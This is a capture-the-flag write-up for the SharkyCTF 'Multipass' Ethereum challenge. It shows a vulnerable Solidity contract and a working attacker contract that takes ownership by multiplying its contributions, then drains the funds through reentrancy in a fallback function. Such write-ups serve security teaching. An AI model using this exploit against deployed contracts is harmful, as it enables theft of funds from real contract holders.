# Multipass

## Setup

The challenge is available at http://ethereum.sharkyctf.xyz/level/3

Before starting, it is recommended to follow the suggested steps at http://ethereum.sharkyctf.xyz/help to setup Metamask, get Ether from a Ropsten faucet, and Remix IDE.

## Challenge

The contract to attack is the following:

```solidity
pragma solidity = 0.4.25;

contract Multipass {
    address public owner;
    uint256 public money;
    
    mapping(address => int256) public contributions;
    
    bool public withdrawn;
    
    constructor() public payable {
        contributions[msg.sender] = int256(msg.value * 900000000000000000000);
        owner = msg.sender;
        money = msg.value;
        withdrawn = false;
    }
    
    function gift() public payable {
        require(contributions[msg.sender] == 0 && msg.value == 0.00005 ether);
        contributions[msg.sender] = int256(msg.value) * 10;
        money += msg.value;
    }
  
    function takeSomeMoney() public {
        require(msg.sender == owner && withdrawn == false);
        uint256 someMoney = money/20;
        if(msg.sender.call.value(someMoney)()){
            money -= someMoney;
        }
        withdrawn = true;
    }
    
    function contribute(int256 _factor) public {
        require(contributions[msg.sender] != 0 && _factor < 10);
        contributions[msg.sender] *= _factor;
    }
    
    function claimContract() public {
        require(contributions[msg.sender] > contributions[owner]);
        owner = msg.sender;
    }
}
```

The goal is then to take all the money of the contract.

## Hint

Can you call `takeSomeMoney()` several times ?

## Solution

This is a classic reentrancy exploit, where you are able to recursively call the same function several time in order to siphon all the money of a contract.

In order to exploit it, we must have another contract with a fallback method which will be called by the Victim contract, and because the state is not updated before calling the Attack contract, we will be able to execute several times `takeSomeMoney()` until no fund is left. 

To attack this contract, we will create another contract called Attack, which will be called to attack the first contract.

In the same Solidity file, add the following code:

```solidity
contract Attack {
    Multipass public target;
    
    constructor(address _adress) public payable{
        target = Multipass(_adress);
        target.gift.value(0.00005 ether)();
    }
    
    function multiplyContributions() public {
        address contractAdress = address(this);
        
        while (target.contributions(contractAdress) <= target.contributions(target.owner())) {
            target.contribute(9);
        }
    }
    
    function takeOwnership() public returns(address){
        multiplyContributions();
        target.claimContract();
    }
    
    function attack() public {
        takeOwnership();
        target.takeSomeMoney();
    }
    
    function () payable public {
        while (!target.withdrawn()) {
            target.takeSomeMoney();
        }
    }
} 
```
